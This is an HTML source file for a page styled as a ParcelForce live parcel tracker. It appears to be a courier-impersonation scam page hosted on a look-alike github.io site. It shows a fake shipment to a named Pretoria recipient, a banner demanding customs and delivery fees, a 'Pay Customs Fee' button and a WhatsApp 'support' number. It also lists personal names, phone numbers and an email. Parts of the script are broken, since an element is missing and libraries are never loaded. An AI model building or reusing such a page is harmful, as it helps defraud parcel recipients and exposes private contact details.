<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>ParcelForce | Live Tracker</title>
  <link rel="icon" href="favicon.ico" type="image/x-icon" />

  <!-- Leaflet CSS/JS (versioned, reliable) -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />

  <style>
    /**
     * ParcelForce â€” Redesigned track.html
     * Mobile-first, accessible, performance-minded layout.
     * Brand red slightly darker: --brand-red: #9B0F22
     */

    :root{
      --brand-red: #9B0F22;      /* darker red you preferred */
      --brand-red-2: #7F0D1A;
      --brand-navy: #0b3d91;
      --muted: #6b7280;
      --bg: #f7f8fb;
      --card: #ffffff;
      --glass: rgba(255,255,255,0.6);
      --radius: 12px;
      --container: 1200px;
      --shadow-lg: 0 12px 40px rgba(2,6,23,0.12);
    }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: var(--bg);
      margin: 0;
      padding: 20px;
      color: var(--text);
    }
    .section {
      background: var(--card);
      border-radius: 16px;
      padding: 30px;
      max-width: 900px;
      margin: 20px auto;
      box-shadow: 0 10px 40px rgba(0,0,0,0.1);
    }
    h2 { text-align: center; color: var(--primary); }
    h3 { margin-top: 24px; color: var(--primary); border-bottom: 2px solid var(--primary); padding-bottom: 8px; }
    p strong { color: var(--primary); }

    .progress-bar { background: #e0e0e0; border-radius: 20px; height: 20px; margin: 16px 0; overflow: hidden; }
    .progress { background: linear-gradient(90deg, var(--primary), #ff4d6d); height: 100%; width: 66%; transition: width 0.6s ease; border-radius: 20px; }

    .progress-container { display: flex; gap: 12px; margin: 16px 0; }
    .progress-step { flex: 1; text-align: center; font-weight: 600; color: #777; }
    .progress-step.active { color: var(--primary); transform: scale(1.02); }

    .status-list { list-style: none; padding: 0; }
    .status-list li { background: #f9f9f9; padding: 12px; border-radius: 8px; border-left: 4px solid var(--primary); margin: 10px 0; }

    .privacy-toggle { text-align: center; margin: 16px 0; }
    #recipientInfo { display: none; background: #f9f9f9; padding: 12px; border-radius: 8px; }

    .alert { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; border-left: 4px solid var(--primary); text-align: center; }

    .support-btn { background: var(--primary); color: #fff; border: none; padding: 10px 16px; border-radius: 8px; cursor: pointer; margin: 6px 4px; font-weight: 600; }
    .support-btn:hover { background: #a00d26; }

    /* Critical: map must have a fixed height */
    #map { height: 350px; border-radius: 12px; margin-top: 12px; }

    #qrCodeContainer { text-align: center; margin-top: 16px; }
  </style>
</head>
<body>
  <div class="section">
    <h2 id="trackingNumber">ðŸ“¦ Tracking Number: RB123456789CN</h2>
    <p><strong>Last Updated:</strong> <span id="lastUpdated">2025-11-24 08:18</span></p>

    <div class="progress-bar"><div class="progress" id="progressFill"></div></div>

    <h3>Parcel journey</h3>
    <div class="progress-container">
      <div class="progress-step" id="step1">Picked Up (UK â€” 22/11/2025)</div>
      <div class="progress-step" id="step2">Arrived in South Africa â€” 24/11/2025</div>
      <div class="progress-step" id="step3">Delivered (Expected 25/11/2025)</div>
    </div>

          <div class="progress-row" aria-hidden="false">
            <div class="progress-bar" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
              <div class="progress-fill" id="progressFill" style="width:0%"></div>
            </div>
            <div class="timeline" id="timeline" aria-hidden="false">
              <div class="step">
                <div class="dot" id="dot1" aria-hidden="true"></div>
                <div class="label">Collected</div>
              </div>
              <div class="step">
                <div class="dot" id="dot2" aria-hidden="true"></div>
                <div class="label">In transit</div>
              </div>
              <div class="step">
                <div class="dot" id="dot3" aria-hidden="true"></div>
                <div class="label">Delivered</div>
              </div>
            </div>
          </div>
        </div>

    <div id="recipientInfo">
      <p><strong>Sender:</strong> Williams Andrew</p>
      <p><strong>Phone:</strong> +44 7349 554526</p>
      <p><strong>Receiver:</strong> Doreen Debra van der Merwe</p>
      <p><strong>Address:</strong> Castle Gate Office Block, VDT Attorneys, Pretoria</p>
      <p><strong>Phone:</strong> 0611470840</p>
      <p><strong>Email:</strong> doreenm@vdt.co.za</p>
    </div>

    <p><strong>Estimated Delivery:</strong> 2025-11-25</p>

    <h3>Status updates</h3>
    <ul class="status-list">
      <li><strong>Last Checkpoint:</strong> Johannesburg OR Tambo Airport â€” Arrived 24/11/2025</li>
    </ul>

    <div class="alert">âš  Customs and delivery fee must be paid before parcel can proceed for Delivery</div>

    <button class="support-btn" onclick="window.location.href='index.html'">ðŸ”™ Back to Home</button>
    <button class="support-btn" onclick="window.open('https://wa.me/27633373857', '_blank')">WhatsApp Support</button>
    <button class="support-btn" onclick="alert('Redirecting to secure payment portal...')">Pay Customs Fee</button>

    <h3>Live map</h3>
    <div id="map"></div>

    <h3>QR code</h3>
    <div id="qrCodeContainer"></div>
  </div>

  <!-- Scripts: load lightweight libs dynamically to avoid blocking -->
  <script>
    // Make sure DOM is ready before running
    window.addEventListener('DOMContentLoaded', () => {
      // Toggle recipient details
      const toggle = document.getElementById('revealInfo');
      const info = document.getElementById('recipientInfo');
      toggle.addEventListener('change', () => {
        info.style.display = toggle.checked ? 'block' : 'none';
      });

      // Progress bar example
      const today = new Date("2025-11-24");
      const step1Date = new Date("2025-11-22");
      const step2Date = new Date("2025-11-24");
      const step3Date = new Date("2025-11-25");
      let width = 33;
      if (today >= step2Date && today < step3Date) {
        width = 66;
        document.getElementById('step2').classList.add('active');
      } else if (today >= step3Date) {
        width = 100;
        document.getElementById('step3').classList.add('active');
      } else {
        document.getElementById('step1').classList.add('active');
      }
      document.getElementById('progressFill').style.width = width + '%';

      // Initialize Leaflet map (Johannesburg OR Tambo)
      const map = L.map('map').setView([-26.1392, 28.2460], 10);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; OpenStreetMap contributors'
      }).addTo(map);
      L.marker([-26.1392, 28.2460]).addTo(map);

      // QR code render
      const params = new URLSearchParams(window.location.search);
      const ref = params.get('ref') || 'RB123456789CN';
      const url = `https://parcel-force.github.io/parcelforce-site/track.html?ref=${ref}`;
      const canvas = document.createElement('canvas');
      QRCode.toCanvas(canvas, url, (err) => {
        if (err) console.error(err);
        document.getElementById('qrCodeContainer').appendChild(canvas);
      });
    });
  </script>
</body>
</html>